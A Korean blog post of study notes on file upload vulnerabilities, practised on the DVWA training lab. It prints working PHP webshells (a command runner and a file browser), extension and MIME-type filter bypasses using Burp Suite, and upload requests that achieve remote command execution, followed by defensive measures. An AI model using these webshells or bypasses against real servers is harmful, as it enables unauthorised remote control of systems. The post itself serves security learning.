---
layout: post
title: "파일 업로드 취약점 공부"
date: 2025-08-28 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

파일 업로드 취약점은 서버 측에서 업로드되는 파일의 확장자나 내용을 제대로 검증하지 않을 때 발생한다. 공격자는 이 취약점을 이용해 악의적인 스크립트 파일(웹쉘)을 서버에 업로드하여 원격에서 시스템 명령어를 실행(RCE)하고 최종적으로 서버의 제어권을 획득할 수 있다.

---

### 2. 주요 우회 기법

단순히 `.php` 파일을 업로드하는 것은 대부분의 필터링에 막히므로 이를 우회하는 기법이 필요하다.

*   ***확장자 필터링 우회:***
    서버가 특정 확장자를 블랙리스트 방식으로 필터링할 때 사용된다. `.php` 대신 `.phtml` · `.php3` · `.inc` 등 웹 서버가 PHP로 해석할 수 있는 다른 확장자를 시도하거나 `shell.pHp`처럼 대소문자를 혼용하여 우회를 시도할 수 있다.

*   ***MIME 타입 검증 우회:***
    서버가 파일 확장자 대신 HTTP 요청 헤더의 `Content-Type`을 기준으로 파일 종류를 판단할 때 사용된다. 이 값은 클라이언트가 보내는 정보이므로 Burp Suite와 같은 프록시 툴을 이용해 `Content-Type: application/x-php`를 `Content-Type: image/jpeg`와 같이 정상적인 이미지 파일처럼 조작하여 필터링을 우회할 수 있다.


---

### 3. 웹쉘 (Webshell)

웹쉘은 웹 서버를 통해 시스템 명령어를 실행할 수 있도록 만들어진 스크립트 파일이다.

#### ***기본 웹쉘***
가장 단순한 형태의 웹쉘은 URL 파라미터를 통해 전달받은 명령어를 그대로 실행하고 결과를 출력한다. `cmd`라는 파라미터로 명령어를 전달받는 예시이다.
```php
<?php
  if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  }
?>
```

이 파일을 `shell.php`로 저장해 업로드하고, 다음과 같이 접근하면 명령어가 실행된다:

```
GET /hackable/uploads/shell.php?cmd=whoami HTTP/1.1
Host: dvwa.local
```

서버 응답은 다음과 같이 `www-data`를 포함한다:

```
HTTP/1.1 200 OK
...

www-data
```

#### ***개선된 웹쉘 (간이 파일 브라우저)***
조금 더 발전된 형태의 웹쉘은 단순히 명령어를 실행하는 것을 넘어 서버의 파일 시스템을 탐색하는 기능을 포함할 수 있다. 아래 코드는 `path` 파라미터로 전달된 경로의 파일과 디렉터리 목록을 보여주는 간단한 파일 브라우저 역할을 한다.
```php
<?php
  $path = isset($_GET['path']) ? $_GET['path'] : '.';
  $files = scandir($path);
  
  foreach($files as $file) {
    // 현재 디렉터리(.)와 상위 디렉터리(..) 링크 생성
    if ($file == '.') {
      echo "<a href='?path={$path}'>.</a><br>";
    } elseif ($file == '..') {
      $parent_path = dirname($path);
      echo "<a href='?path={$parent_path}'>..</a><br>";
    } else {
      echo $file . "<br>";
    }
  }
?>
```

---

### 4. 사용 예시: Burp Suite를 이용한 MIME 타입 우회

서버가 `Content-Type` 헤더만 검증한다면, 공격자는 이를 조작해 PHP 파일을 업로드할 수 있다.

#### ***1. 원본 요청 (차단됨)***
```http
POST /vulnerabilities/upload/ HTTP/1.1
Host: dvwa.local
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary...
```
→ 이 요청은 대부분의 필터에서 차단된다.

#### ***2. 변조된 요청 (우회 성공)***
Burp Suite에서 `Content-Type`을 `image/jpeg`로 수정:

```http
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg   ← 여기만 바뀜!
```

이 요청을 전송하면 서버가 "이건 이미지야"라고 판단해 파일을 저장한다.

#### ***3. 웹쉘 실행 확인***
업로드 후, 다음 URL로 접근:

```
http://dvwa.local/hackable/uploads/shell.php?cmd=id
```

응답 본문에 다음이 출력되면 성공:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 5. 방어 방안

*   ***확장자 화이트리스트:*** `.php`, `.jsp` 등 위험한 확장자를 금지하는 블랙리스트 방식 대신 `.jpg` · `.png` · `.gif` 와 같이 허용된 확장자만 업로드할 수 있도록 화이트리스트 방식을 사용해야 한다.
*   ***파일 내용 검증:*** 확장자나 MIME 타입은 조작될 수 있으므로 `getimagesize()`와 같은 함수를 이용해 파일의 내용이 실제 이미지 데이터인지 검증해야 한다.
*   ***업로드 경로 제어:*** 업로드된 파일이 저장되는 디렉터리는 웹에서 직접 접근할 수 없는 경로(Web Root 외부)에 위치시키거나 만약 웹에서 접근해야 한다면 해당 디렉터리의 스크립트 실행 권한을 제거해야 한다.

<hr class="short-rule">